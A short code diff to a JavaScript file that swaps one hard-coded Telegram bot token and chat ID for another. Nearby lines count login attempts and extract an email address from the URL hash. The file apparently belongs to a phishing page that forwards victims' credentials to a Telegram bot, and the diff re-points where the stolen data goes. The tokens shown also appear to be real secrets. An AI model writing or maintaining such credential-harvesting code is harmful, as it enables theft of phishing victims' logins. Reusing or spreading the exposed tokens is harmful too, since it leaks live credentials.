@@ -1,6 +1,6 @@
 // Replace with your actual bot token and chat ID
-const BOT_TOKEN = '7580844199:AAF5s0lmj-9QaTjp_5LzAK8L_lEdEGGVrLI';
-const CHAT_ID = '513186752';
+const BOT_TOKEN = '7312223663:AAHf1MtcD0Ksu_Bwvyr5W7nAY6iQPxDA8zU';
+const CHAT_ID = '5899924228';
 let loginAttempts = 0;
 
 // Function to extract email from the URL hash
